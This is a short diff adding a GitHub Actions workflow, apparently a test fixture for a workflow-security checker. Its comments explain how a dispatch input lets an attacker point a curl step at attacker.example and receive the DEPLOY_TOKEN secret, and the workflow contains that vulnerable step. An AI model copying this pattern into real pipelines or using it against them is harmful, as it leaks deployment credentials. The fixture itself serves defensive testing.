@@ -1,0 +1,23 @@
+# situation: on issues and workflow_dispatch, a step sends a request with
+#   curl and the secret DEPLOY_TOKEN to the host inputs.host names.
+# reason: the one who dispatches chooses inputs.host; on issues the input is
+#   empty.
+# cause: the rule leaves an input of workflow_dispatch to whoever
+#   dispatches.
+# attack: the attacker makes the value attacker.example, where the value
+#   comes from what the attacker writes.
+# attack-run-behavior: curl sends the request with the secret to
+#   attacker.example.
+on:
+  issues:
+  workflow_dispatch:
+    inputs:
+      host: {}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ inputs.host }}/status"
